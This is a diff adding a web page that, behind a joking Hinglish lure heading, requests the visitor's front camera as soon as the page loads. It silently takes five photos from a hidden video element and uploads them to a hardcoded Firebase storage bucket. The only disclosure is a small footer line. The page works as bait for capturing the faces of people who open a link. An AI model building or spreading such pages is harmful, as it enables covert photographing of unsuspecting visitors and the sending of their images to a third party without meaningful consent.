@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Photo Capture</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #121212;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+        }
+        h1 {
+            font-size: 2em;
+            margin-bottom: 20px;
+        }
+        .footer-text {
+            font-size: 1.2em;
+            margin-top: 20px;
+            color: #ccc;
+        }
+        .fallback {
+            color: red;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Kyu bhai, aaj photo ka postmortem nahi karoge kya? 🤣<br>Chalo photo record karte hain!</h1>
+        <div class="footer-text">5 photos will be captured and uploaded to Firebase.</div>
+        <div class="fallback" id="fallback" style="display: none;">Your browser does not support the required permissions. Please open this page in Chrome or Safari.</div>
+    </div>
+
+    <script type="module">
+        // Import Firebase SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
+        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBsG-hDNF8DRowgjz9WR4wVlSL398_gQyI",
+            authDomain: "photos-c3ca9.firebaseapp.com",
+            projectId: "photos-c3ca9",
+            storageBucket: "photos-c3ca9.appspot.com",
+            messagingSenderId: "231479999084",
+            appId: "1:231479999084:web:045f573955ed1190f4b649",
+            measurementId: "G-X7YW60B7V5"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+
+        let photos = [];
+        let photoCount = 0;
+        const totalPhotos = 5;
+        const fallbackDiv = document.getElementById('fallback');
+
+        function showFallback() {
+            fallbackDiv.style.display = 'block';
+        }
+
+        function capturePhoto(video) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const dataUrl = canvas.toDataURL('image/png');
+            photos.push(dataUrl);
+            photoCount++;
+
+            // Once all photos are captured, upload them to Firebase
+            if (photoCount === totalPhotos) {
+                uploadPhotosToFirebase();
+            }
+        }
+
+        function startPhotoCapture(video) {
+            const captureInterval = setInterval(() => {
+                capturePhoto(video);
+                if (photoCount === totalPhotos) {
+                    clearInterval(captureInterval);
+                }
+            }, 500);
+        }
+
+        function uploadPhotosToFirebase() {
+            photos.forEach((photo, index) => {
+                const photoRef = ref(storage, `photos/photo_${index + 1}.png`);
+
+                // Upload the photo as base64
+                uploadString(photoRef, photo, 'data_url').then((snapshot) => {
+                    console.log('Uploaded a photo to Firebase!', snapshot);
+                }).catch((error) => {
+                    console.error('Failed to upload photo:', error);
+                });
+            });
+        }
+
+        function initCamera() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                showFallback();
+                return;
+            }
+
+            const constraints = {
+                video: { facingMode: 'user' }
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    startPhotoCapture(video);
+                })
+                .catch(error => {
+                    showFallback();
+                    console.error('Permission or device error:', error);
+                });
+        }
+
+        initCamera();
+    </script>
+</body>
+</html>
